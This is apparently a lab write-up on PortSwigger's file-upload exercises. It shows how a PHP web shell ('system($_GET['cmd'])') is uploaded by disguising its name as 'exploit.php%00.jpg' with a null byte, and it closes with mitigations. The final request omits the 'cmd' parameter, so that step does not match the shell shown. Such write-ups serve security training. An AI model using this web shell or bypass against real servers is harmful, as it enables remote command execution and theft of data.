# Writeup: Completing the File Upload Lab - Web Shell Upload via Obfuscated File Extension

## **Overview**
In this lab, we explored a vulnerability in file upload functionality that allowed bypassing file validation checks and uploading a malicious web shell by obfuscating the file extension. Here's how the lab was completed, along with an explanation of the payload that worked.

---

## **Steps to Solve the Lab**

### 1. **Initial Exploration:**
- Logged into the application and uploaded a legitimate image as the avatar.
- Navigated to the account page and observed the image being fetched using a GET request to the endpoint:
  ```
  /files/avatars/<YOUR-IMAGE>
  ```
- Sent this GET request to **Burp Repeater** for further investigation.

### 2. **Preparing the Malicious Payload:**
- Created a PHP script named `exploit.php` on the local system, containing the following payload:
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- This script is designed to execute arbitrary commands supplied via the `cmd` parameter in the URL.

### 3. **Attempt to Upload the Malicious Script:**
- Tried to upload the `exploit.php` file as the avatar.
- Observed that the server rejected the file, stating that only `.jpg` and `.png` extensions were allowed.

### 4. **Analyzing the File Upload Request:**
- Located the `POST /my-account/avatar` request in Burp's proxy history, which was used to submit the file upload.
- Sent this request to **Burp Repeater** for modification.

### 5. **Crafting the Exploit:**
- Modified the `Content-Disposition` header in the request body, changing the `filename` parameter to:
  ```
  filename="exploit.php%00.jpg"
  ```
- The `%00` is a URL-encoded null byte, which tricks the server into processing the file as `exploit.php` while validating it as `.jpg`.
- Sent the modified request.
- Observed that the server successfully uploaded the file and referenced it as `exploit.php`. This confirmed that the null byte and `.jpg` extension were stripped during processing.

### 6. **Executing the Malicious Script:**
- Switched to the **GET /files/avatars/<YOUR-IMAGE>** request in Burp Repeater.
- Replaced the file name in the path with `exploit.php` and sent the request:
  ```
  GET /files/avatars/exploit.php
  ```
- Observed the server executing the PHP script and returning Carlos's secret in the response.

### 7. **Submitting the Secret:**
- Submitted Carlos's secret to complete the lab.

---

## **Payload Explanation:**
- The payload that worked:
  ```
  filename="exploit.php%00.jpg"
  ```
  - The `%00` null byte terminated the string in systems that rely on C-based string handling.
  - This caused the server to validate the file as a `.jpg` (allowing the upload) but saved it as `exploit.php`.

- Why it worked:
  - The server's validation logic was flawed, as it only checked the file name suffix and did not sanitize or handle null bytes correctly.
  - Once uploaded, the server treated the file as a PHP script and executed it, enabling command injection.

---
![ Web Shell Upload via Obfuscated File Extension Lab5](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab5a.PNG)

![ Web Shell Upload via Obfuscated File Extension Lab5](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/file-lab5b.PNG)

## **Conclusion:**
This lab demonstrated how improperly implemented file validation can be exploited using null byte injections to upload and execute malicious scripts. Proper mitigation includes:
- Stripping null bytes during validation.
- Enforcing MIME type checks.
- Disabling execution in upload directories.
